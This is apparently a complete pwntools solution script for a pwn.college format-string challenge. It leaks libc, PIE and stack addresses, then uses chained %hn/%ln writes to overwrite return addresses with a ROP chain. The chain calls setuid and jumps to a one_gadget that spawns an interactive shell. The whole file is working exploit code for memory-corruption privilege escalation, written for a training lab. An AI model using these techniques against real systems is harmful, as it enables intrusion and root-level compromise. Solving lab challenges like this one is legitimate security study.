from pwn import p64,u64
from pwn import *
context.binary=e=ELF("./babyfmt_level11.1")
libc=e.libc
gs="""
b *func+273
b *main+378
"""
if args.DEBUG:
    context.log_level="debug"
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfmt_level11.1")
def overwrite_addr(addr1, value1,addr2=0,value2=0,addr3=0):
    write_list=[value1 >> (16*i) & 0xffff for i in range(3)]
    writes1={}
    for i in range(3):
        writes1[write_list[i]]=addr1+i*2
    if addr2:
        write_list+=[value2 >> (16*i) & 0xffff for i in range(3)]
        writes2={}
        for i in range(3):
            writes2[write_list[i+3]]=addr2+i*2       
    write_list.sort()
    payload =b''
    if addr3:
        payload+=f"%{84+len(write_list)}$ln%{-65+0x1_0000}c%{84+len(write_list)}$hn".encode()
        payload+=f"%{write_list[0]}c%84$hn".encode()
    else:
        payload +=f"%{write_list[0]-65+0x1_0000}c%84$hn".encode()
    for i in range(1,len(write_list)):
        payload+=f"%{write_list[i]-write_list[i-1]+0x1_0000}c%{84+i}$hn".encode()
    payload+=b"lmao"
    payload+=b"X"*(79+0x20-len(payload))
    for i in range(len(write_list)):
        try:
            payload+=p64(writes1[write_list[i]])
            writes1.pop(write_list[i])
        except:
            payload+=p64(writes2[write_list[i]])
            writes2.pop(write_list[i])
    if addr3:
        payload+=p64(addr3)
    p.sendlineafter(b"lmao",payload)
#stage1 : leak
p.sendlineafter(b"Have fun!\n",
                b"%205$p%7$p%190$plmao")
p.recvuntil(b"0x")
libc.address=int(p.recv(12),16)-(libc.sym.__libc_start_main+243)
p.recvuntil(b"0x")
buffer_locate=int(p.recv(12),16)
p.recvuntil(b"0x")
e.address=int(p.recv(12),16)-e.sym.__libc_csu_init
log.info(f"libc @ {hex(libc.address)}")
log.info(f"pie @ {hex(e.address)}")
log.info(f"buffer @ {hex(buffer_locate)}")
pop_rdi_ret=0x0000000000001613+e.address
overwrite_addr(buffer_locate-521,e.sym.main+355)
sleep(1)
overwrite_addr(buffer_locate+0x437,pop_rdi_ret,
               buffer_locate+0x437+0x10,libc.sym.setuid,
               buffer_locate+0x437+8)
sleep(1)
overwrite_addr(buffer_locate+0x437+0x18,e.sym.func,
               buffer_locate-0x7f9,e.sym.main+377)
sleep(1)
overwrite_addr(buffer_locate-0x199,libc.address+0xe3b01)
p.interactive()
